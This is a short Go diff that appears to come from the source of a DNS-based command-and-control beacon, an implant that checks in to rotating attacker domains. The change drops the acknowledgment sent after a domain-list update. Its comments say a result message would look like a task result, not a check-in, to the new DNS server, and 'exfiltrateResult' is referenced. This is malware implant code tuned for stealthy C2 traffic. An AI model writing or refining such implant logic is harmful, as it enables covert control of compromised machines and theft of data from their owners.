@@ -425,20 +425,16 @@ func (b *Beacon) runBeacon() {
 				// Special system command to update DNS domain list
 				domainsJSON := command[15:] // Skip "update_domains:" prefix
 
-				// Update the domain list FIRST
+				// Update the domain list
 				b.handleUpdateDomains(domainsJSON)
 
-				// Send simple acknowledgment directly (bypass exfiltrateResult complexity)
-				// Format: RESULT|beaconID|taskID|result
-				ackMsg := fmt.Sprintf("RESULT|%s|%s|domains_updated", b.id, taskID)
-				_, _ = b.client.sendCommand(ackMsg)
-
-				// CRITICAL: The next check-in will automatically go to a different domain
-				// because lastDomain is set to the domain that sent this task,
-				// and selectDomain's Shadow Mesh logic avoids the last used domain
+				// NOTE: We don't send a result for update_domains tasks
+				// The beacon will naturally check in to the new DNS servers in the next cycle
+				// Sending a RESULT would cause the new DNS server to receive it immediately,
+				// which looks like a task result instead of a check-in
 
 				// Continue to next check-in cycle immediately
-				// The sleep will happen at the top of the loop, then check-in to a different domain
+				// The sleep will happen at the top of the loop, then check-in will use the new domain list
 				continue
 			}
 
